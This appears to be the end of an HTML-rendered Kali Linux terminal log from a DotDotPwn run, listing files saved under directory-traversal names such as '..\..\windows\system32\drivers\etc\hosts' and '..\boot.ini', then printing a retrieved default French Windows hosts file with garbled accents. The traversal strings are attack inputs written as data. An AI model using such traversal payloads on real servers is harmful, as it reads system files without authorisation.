+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\\..\\.\\..\\.\\..\\.\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 .\\..\\.\\..\\.\\..\\boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:56 \boot.ini<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 206 Feb 10 21:57 boot.ini<br/>
+drwxr-xr-x &nbsp; 2 root root &nbsp;4096 Sep &nbsp;7 10:56 DotDotPwn<br/>
+-rwxr-xr-x &nbsp; 1 root root 13045 Aug 11 &nbsp;2013 dotdotpwn.pl<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:56 \hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 19:13 ..\..\..\..\..\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 19:13 ..\..\..\..\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 19:13 ..\..\..\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 19:13 ..\..\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\\..\\\..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\\..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:55 ..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\..\.\..\.\..\.\..\.\..\.\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\..\.\..\.\..\.\..\.\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\..\.\..\.\..\.\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\..\.\..\.\..\windows\system32\drivers\etc\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:58 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\\..\\.\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+-rw-r--r-- &nbsp; 1 root root &nbsp; 770 Feb 10 21:57 .\\..\\.\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts<br/>
+root@kali:/usr/share/dotdotpwn# cat hosts<br/>
+# Copyright (c) 1993-1999 Microsoft Corp.<br/>
+#<br/>
+# Ceci est un exemple de fichier HOSTS utilis� par Microsoft TCP/IP<br/>
+# pour Windows.<br/>
+#<br/>
+# Ce fichier contient les correspondances des adresses IP aux noms d'h�tes.<br/>
+# Chaque entr�e doit �tre sur une ligne propre. L'adresse IP doit �tre plac�e<br/>
+# dans la premi�re colonne, suivie par le nom d'h�te correspondant. L'adresse<br/>
+# IP et le nom d'h�te doivent �tre s�par�s par au moins un espace.<br/>
+#<br/>
+# De plus, des commentaires (tels que celui-ci) peuvent �tre ins�r�s sur des<br/>
+# lignes propres ou apr�s le nom d'ordinateur. Ils sont indiqu� par le<br/>
+# symbole '#'.<br/>
+#<br/>
+# Par exemple :<br/>
+#<br/>
+# &nbsp; &nbsp; &nbsp;102.54.94.97 &nbsp; &nbsp; rhino.acme.com &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# serveur source<br/>
+# &nbsp; &nbsp; &nbsp; 38.25.63.10 &nbsp; &nbsp; x.acme.com &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# h�te client x<br/>
+<br/>
+127.0.0.1 &nbsp; &nbsp; &nbsp; localhost<br/>
+root@kali:/usr/share/dotdotpwn# <br/>
+</body></html>
